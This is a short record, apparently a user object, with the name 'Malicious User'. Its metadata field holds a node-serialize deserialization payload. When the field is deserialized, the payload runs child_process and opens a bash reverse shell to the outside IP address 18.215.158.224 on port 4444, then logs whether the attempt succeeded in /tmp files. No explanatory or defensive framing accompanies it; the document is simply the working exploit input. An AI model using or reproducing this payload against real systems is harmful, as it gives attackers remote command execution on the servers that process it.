name: Malicious User
metadata: {"rce":"_$$ND_FUNC$$_function(){const cp = require('child_process'); const fs = require('fs'); try { fs.writeFileSync('/tmp/shell_attempt.log', 'Attempting reverse shell'); cp.exec('/bin/bash -c \"/bin/bash -i > /dev/tcp/18.215.158.224/4444 0<&1 2>&1\"', function(error, stdout, stderr) { if (error) { fs.writeFileSync('/tmp/shell_error.log', 'ERROR: ' + error.message); } else { fs.writeFileSync('/tmp/shell_success.log', 'Shell executed successfully'); } if (stderr) { fs.writeFileSync('/tmp/shell_stderr.log', stderr); } }); } catch (e) { fs.writeFileSync('/tmp/shell_exception.log', 'EXCEPTION: ' + e.message); } return '';}()"}
